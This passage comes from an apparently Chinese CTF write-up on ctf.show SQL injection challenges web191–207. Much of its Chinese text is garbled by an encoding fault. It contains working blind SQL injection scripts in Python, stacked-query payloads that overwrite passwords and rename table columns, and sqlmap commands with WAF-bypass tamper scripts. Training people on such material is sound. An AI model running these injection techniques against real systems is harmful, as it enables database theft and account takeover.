id="web191â€”â€”ordä»£æ›¿ascii"><a href="#web191â€”â€”ordä»£æ›¿ascii" class="headerlink" title="web191â€”â€”ordä»£æ›¿ascii"></a>web191â€”â€”ordä»£æ›¿ascii</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¯†ç æ£€æµ‹</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//å¯†ç åˆ¤æ–­</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†190è„šæœ¬ä¿®æ”¹å³å¯</p><h1 id="web192â€”â€”boolç›²æ³¨"><a href="#web192â€”â€”boolç›²æ³¨" class="headerlink" title="web192â€”â€”boolç›²æ³¨"></a>web192â€”â€”boolç›²æ³¨</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®åº“</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥è¡¨</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥å­—æ®µ</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment" spellcheck="true"># æŸ¥flag</span>        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web193â€”â€”boolç›²æ³¨"><a href="#web193â€”â€”boolç›²æ³¨" class="headerlink" title="web193â€”â€”boolç›²æ³¨"></a>web193â€”â€”boolç›²æ³¨</h1><p>ç¦ç”¨substr</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/3 16:46</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sysurl <span class="token operator">=</span> <span class="token string">'http://955bf0a2-3516-4e57-9534-f5029f4ada04.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-_,{}'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"' or if((select group_concat(f1ag) from ctfshow_flxg) like '{}',1,0) ='1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web194â€”â€”boolç›²æ³¨ã€LOCATE"><a href="#web194â€”â€”boolç›²æ³¨ã€LOCATE" class="headerlink" title="web194â€”â€”boolç›²æ³¨ã€LOCATE"></a>web194â€”â€”boolç›²æ³¨ã€<code>LOCATE</code></h1><p>ç”¨åˆ°äº†<code>locate</code></p><p><code>LOCATE(substr,string)</code><br>è¿”å›å­—ç¬¦ä¸²<code>string</code>ä¸­<strong>ç¬¬ä¸€æ¬¡</strong>å‡ºç°å­å­—ç¬¦ä¸²çš„ä½ç½® <code>subtr</code>ï¼Œä»1å¼€å§‹è®¡æ•°<br>ä¾‹å¦‚ï¼šSELECT LOCATE(â€˜2â€™, â€˜123â€™) è¿”å› 2</p><p><strong>payloadï¼š</strong></p><p><code>payload=&quot;&#39; or if((locate(&#39;{}&#39;,(select group_concat(f1ag) from ctfshow_flxg limit 0,1))=1),1,2)=&#39;1&quot;.format(flag+j)</code></p><p>æ¥ä¸‹æ¥ä¸€ä¸ªæ‹¬å·ä¸€ä¸ªæ‹¬å·çš„åˆ†æï¼š</p><p><code>select group_concat(f1ag) from ctfshow_flxg limit 0,1</code>=ctfshow{123456789}</p><p><code>locate(&#39;ctfshow{&#39;,(ctfshow{123456789}))=1</code></p><p>å‰©ä¸‹if å°±ä¸è§£é‡Šäº†ï¼Œå¯ä»¥æœ¬åœ°è¯•ä¸€ä¸‹</p><p>æ›´æ¢ä¸Šé¢˜è„šæœ¬çš„payloadå³å¯</p><h1 id="web195â€”â€”å †å æ³¨å…¥ã€UPDATE"><a href="#web195â€”â€”å †å æ³¨å…¥ã€UPDATE" class="headerlink" title="web195â€”â€”å †å æ³¨å…¥ã€UPDATE"></a>web195â€”â€”å †å æ³¨å…¥ã€<code>UPDATE</code></h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username};"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¯†ç æ£€æµ‹</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//å¯†ç åˆ¤æ–­</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"ç™»é™†æˆåŠŸ flag is $flag"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">payload="0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"# è‡³äºä¸ºä»€ä¹ˆéå¾—ç”¨åå…­è¿›åˆ¶ç™»å½•ï¼Œæ˜¯å› ä¸ºä¸‹é¢è¿™ä¸ªæ²¡æœ‰å­—ç¬¦ä¸²å•å¼•å·åŒ…å›´sql = "select pass from ctfshow_user where username = {$username};";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>admin</code> &lt;=&gt; <code>0x61646d696e</code></p><p><code>111</code>&lt;=&gt;<code>0x313131</code></p><h1 id="web196â€”â€”bugé¢˜ç›®"><a href="#web196â€”â€”bugé¢˜ç›®" class="headerlink" title="web196â€”â€”bugé¢˜ç›®"></a>web196â€”â€”bugé¢˜ç›®</h1><p>å…³é”®ä¹‹å¤„ï¼š<code>$row[0]==$password</code></p><p><code>unameï¼š1;select(666)</code></p><p><code>passwdï¼š666</code></p><h1 id="web197-198â€”â€”å †å æ³¨å…¥ã€ä¿®æ”¹åˆ—å"><a href="#web197-198â€”â€”å †å æ³¨å…¥ã€ä¿®æ”¹åˆ—å" class="headerlink" title="web197-198â€”â€”å †å æ³¨å…¥ã€ä¿®æ”¹åˆ—å"></a>web197-198â€”â€”å †å æ³¨å…¥ã€ä¿®æ”¹åˆ—å</h1><p>é€šè¿‡æŠŠå¯†ç åˆ—ä¸idäº’æ¢ä¹‹åï¼Œé™ä½å¯†ç çš„çˆ†ç ´éš¾åº¦ï¼Œå®ç°ç®€å•çˆ†ç ´å¯†ç </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>    <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># username=0;show tables;</span><span class="token comment" spellcheck="true"># pass=ctfshow_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>éå¸¸æœºæ™ºçš„åšæ³•</p><h1 id="å¼€å§‹ç³»ç»Ÿç»ƒä¹ sqlmapçš„ä½¿ç”¨"><a href="#å¼€å§‹ç³»ç»Ÿç»ƒä¹ sqlmapçš„ä½¿ç”¨" class="headerlink" title="å¼€å§‹ç³»ç»Ÿç»ƒä¹ sqlmapçš„ä½¿ç”¨"></a>å¼€å§‹ç³»ç»Ÿç»ƒä¹ sqlmapçš„ä½¿ç”¨</h1><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>éœ€è¦å­¦ä¼šï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"> ä½¿ç”¨<span class="token operator">--</span>user<span class="token operator">-</span>agent æŒ‡å®šagent <span class="token operator">--</span>user<span class="token operator">-</span>agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span> ä½¿ç”¨<span class="token operator">--</span>referer ç»•è¿‡refereræ£€æŸ¥ <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token string">"ctf.show"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161457844.png" alt="image-20210806161457844"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161954869.png" alt></p><h1 id="web202â€”â€”postæ–¹æ³•"><a href="#web202â€”â€”postæ–¹æ³•" class="headerlink" title="web202â€”â€”postæ–¹æ³•"></a>web202â€”â€”postæ–¹æ³•</h1><p><strong>ä½¿ç”¨â€“data è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼ï¼Œä¸»è¦é’ˆå¯¹postä¼ å‚ï¼Œä¹Ÿå¯ä»¥å…ˆburpæŠ“åŒ…ç”¨-r a.txtæ¥å®ç°sqlmap</strong></p><p><code>--data=&quot;id=1&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806184447194.png" alt></p><h1 id="web203â€”â€”putæ–¹æ³•"><a href="#web203â€”â€”putæ–¹æ³•" class="headerlink" title="web203â€”â€”putæ–¹æ³•"></a>web203â€”â€”putæ–¹æ³•</h1><pre><code>ä½¿ç”¨--method è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼--method=&quot;xxx&quot;å¼ºåˆ¶ä½¿ç”¨ç»™å®šçš„HTTPæ–¹æ³•(ä¾‹å¦‚ï¼šPUT)ä½¿ç”¨--method=&quot;PUT&quot;æ—¶ï¼Œéœ€è¦åŠ ä¸Š--headers=&quot;Content-Type: text/plain&quot;å¦åˆ™æ˜¯æŒ‰è¡¨å•æäº¤çš„ï¼Œputæ¥æ”¶ä¸åˆ°</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807203607411.png" alt></p><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><pre><code> ä½¿ç”¨--cookie æäº¤cookieæ•°æ® --cookie=&quot;xx=xx&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807205057245.png" alt></p><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><p>æç¤ºï¼š<strong>apiè°ƒç”¨éœ€è¦é‰´æƒ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807220923417.png" alt></p><p>ä¹Ÿå°±æ˜¯å› ä¸ºè¿™ä¸ªçš„åŸå› ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®<code>--safe-urlå’Œ--safe-freq</code>ï¼Œå› ä¸ºæŠ“åŒ…å‘ç°ï¼Œæ¯æ¬¡è®¿é—®<code>index.php</code>å‰éƒ½ä¼šå…ˆè®¿é—®<code>getToken.php</code>æ‰èƒ½è¡Œ</p><p><strong><code>--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥</code><br><code>--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</code></strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807221310654.png" alt></p><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><pre class="line-numbers language-php"><code class="language-php">sqléœ€è¦é—­åˆ<span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"') limit 0,1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sqlmapèƒ½è‡ªåŠ¨è¿›è¡Œé—­åˆæ“ä½œ</p><p><code>python sqlmap.py -u http://.challenge.ctf.show:8080/api/index.php --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 -D &quot;ctfshow_web&quot; -T ctfshow_flaxc -C flagv --dump</code></p><h1 id="web207â€”â€”sqlmapä¸­tamperçš„ä½¿ç”¨"><a href="#web207â€”â€”sqlmapä¸­tamperçš„ä½¿ç”¨" class="headerlink" title="web207â€”â€”sqlmapä¸­tamperçš„ä½¿ç”¨"></a>web207â€”â€”sqlmapä¸­tamperçš„ä½¿ç”¨</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä½¿ç”¨tamperè„šæœ¬ä¿®æ”¹æ³¨å…¥æ•°æ®:</strong><br><code>sqlmap -u &quot;xxx&quot; --tamper &#39;è„šæœ¬å&#39;</code></p><pre><code>å¸¸è§çš„tamperæœ‰ï¼šapostrophemask.py     ç”¨utf8ä»£æ›¿å¼•å·equaltolike.py         MSSQL * SQLiteä¸­like ä»£æ›¿ç­‰å·greatest.py         MySQLä¸­ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·space2hash.py         ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦space2comment.py    ç”¨/**/ä»£æ›¿ç©ºæ ¼apostrophenullencode.py     MySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQLç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·halfversionedmorekeywords.py     å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®ºspace2morehash.py      MySQLä¸­ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦appendnullbyte.p      Microsoft Accessåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç ifnull2ifisnull.py      MySQLï¼ŒSQLite (possibly)ï¼ŒSAP MaxDBç»•è¿‡å¯¹ IFNULL è¿‡æ»¤space2mssqlblank.py  mssqlç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·base64encode.py      ç”¨base64ç¼–ç space2mssqlhash.py mssqlæŸ¥è¯¢ä¸­æ›¿æ¢ç©ºæ ¼modsecurityversioned.py     mysqlä¸­è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Šspace2mysqlblank.py      mysqlä¸­ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·between.py              MS SQL 2005ï¼ŒMySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 